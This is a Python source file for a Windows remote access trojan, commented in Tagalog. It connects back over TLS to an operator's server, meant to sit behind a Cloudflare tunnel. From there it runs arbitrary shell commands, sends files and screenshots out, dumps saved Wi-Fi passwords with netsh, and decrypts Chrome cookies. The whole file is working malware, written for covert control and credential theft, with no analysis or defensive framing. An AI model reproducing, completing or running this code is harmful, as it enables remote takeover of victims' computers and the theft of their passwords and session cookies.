import socket
import ssl
import subprocess
import time
import os
import pyautogui
import shutil
import sqlite3
import base64
import json
import win32crypt
from Crypto.Cipher import AES
import urllib.request

HOST = '127.0.0.1'  # Ilagay dito ang Cloudflare Tunnel address mo
PORT = 4443
CHECK_INTERVAL = 10  # seconds para mag-check ng internet

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted.decode()
    except:
        return "[Decryption Failed]"

def is_connected():
    """Check if internet is available"""
    try:
        urllib.request.urlopen("http://1.1.1.1", timeout=5)
        return True
    except:
        return False

def connect():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    while True:
        if is_connected():
            try:
                sock = socket.socket()
                s = context.wrap_socket(sock, server_hostname=HOST)
                s.connect((HOST, PORT))
                print("[*] Connected to server.")
                return s
            except Exception as e:
                print(f"[!] Connection failed: {e}. Retrying in {CHECK_INTERVAL}s...")
        else:
            print("[*] No internet. Sleeping...")
        time.sleep(CHECK_INTERVAL)

def handle_server(s):
    cwd = os.getcwd()
    try:
        while True:
            cmd = s.recv(4096).decode().strip()
            if not cmd:
                continue
            if cmd.lower() == "exit":
                break
            if cmd.lower() == "cmd":
                cmd = "ver && echo. && cd"

            # --- Change Directory ---
            if cmd.lower().startswith("cd"):
                path = cmd[3:].strip()
                new_dir = os.path.join(cwd, path) if not os.path.isabs(path) else path
                if os.path.isdir(new_dir):
                    cwd = os.path.abspath(new_dir)
                    s.sendall((cwd + "\n__end__").encode())
                else:
                    s.sendall(b"The system cannot find the path specified.\n__end__")
                continue

            # --- Download File ---
            if cmd.lower().startswith("download "):
                try:
                    filename = cmd[9:].strip()
                    file_path = os.path.join(cwd, filename)
                    if not os.path.isfile(file_path):
                        s.sendall(f"[!] File not found: {filename}\n__end__".encode())
                        continue
                    with open(file_path, "rb") as f:
                        data = f.read()
                    s.sendall(f"FILE {len(data)}\n".encode())
                    s.sendall(data)
                except Exception as e:
                    s.sendall(f"[!] Download error: {e}\n__end__".encode())
                continue

            # --- Screenshot ---
            if cmd.lower() == "screenshot":
                try:
                    temp_file = os.path.join(os.getenv("TEMP"), "scr_temp.png")
                    pyautogui.screenshot(temp_file)
                    with open(temp_file, "rb") as f:
                        img_data = f.read()
                    s.sendall(f"SCREENSHOT {len(img_data)}\n".encode())
                    s.sendall(img_data)
                    os.remove(temp_file)
                except Exception as e:
                    s.sendall(f"[!] Screenshot error: {e}\n__end__".encode())
                continue

            # --- WiFi Dump ---
            if cmd.lower() == "wifi_dump":
                try:
                    result = subprocess.run("netsh wlan show profiles", shell=True, capture_output=True, text=True)
                    profiles = []
                    for line in result.stdout.splitlines():
                        if "All User Profile" in line:
                            name = line.split(":")[1].strip()
                            profiles.append(name)
                    dump = ""
                    for profile in profiles:
                        cmd_wifi = f'netsh wlan show profile "{profile}" key=clear'
                        result = subprocess.run(cmd_wifi, shell=True, capture_output=True, text=True)
                        for line in result.stdout.splitlines():
                            if "Key Content" in line:
                                password = line.split(":")[1].strip()
                                dump += f"{profile}: {password}\n"
                                break
                        else:
                            dump += f"{profile}: [NO PASSWORD FOUND]\n"
                    if not dump:
                        dump = "[!] No Wi-Fi profiles found or no passwords."
                    s.sendall(dump.encode() + b"__end__")
                except Exception as e:
                    s.sendall(f"[!] Wi-Fi dump error: {e}\n__end__".encode())
                continue

            # --- Cookie Dump ---
            if cmd.lower() == "cookie_dump":
                try:
                    cookie_db = os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies")
                    if not os.path.exists(cookie_db):
                        s.sendall(b"[!] Chrome Cookie DB not found.\n__end__")
                        continue
                    temp_db = os.path.join(os.getenv("TEMP"), "chrome_cookies.db")
                    shutil.copy2(cookie_db, temp_db)
                    with open(os.path.expandvars(r"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Local State"), "r", encoding="utf-8") as f:
                        local_state = json.load(f)
                    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
                    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                    conn = sqlite3.connect(temp_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                    def decrypt_cookie(enc_val):
                        try:
                            iv = enc_val[3:15]
                            payload = enc_val[15:]
                            cipher = AES.new(master_key, AES.MODE_GCM, iv)
                            decrypted = cipher.decrypt(payload)
                            return decrypted.decode()
                        except:
                            return "[Decryption Failed]"
                    cookies = ""
                    for host, name, encrypted_value in cursor.fetchall():
                        value = decrypt_cookie(encrypted_value)
                        cookies += f"{host}\n  {name} = {value}\n\n"
                    cursor.close()
                    conn.close()
                    os.remove(temp_db)
                    if cookies.strip():
                        s.sendall(cookies.encode() + b"__end__")
                    else:
                        s.sendall(b"[!] No cookies found.\n__end__")
                except Exception as e:
                    s.sendall(f"[!] Cookie dump error: {e}\n__end__".encode())
                continue

            # --- Shell Command ---
            result = subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True, text=True)
            output = result.stdout + result.stderr
            if not output:
                output = "[*] No output returned.\n"
            s.sendall(output.encode() + b"__end__")

    except Exception as e:
        print(f"[!] Session error: {e}")

if __name__ == "__main__":
    while True:
        sock = connect()
        handle_server(sock)
        print("[*] Connection lost. Waiting for internet to reconnect...")
        time.sleep(CHECK_INTERVAL)
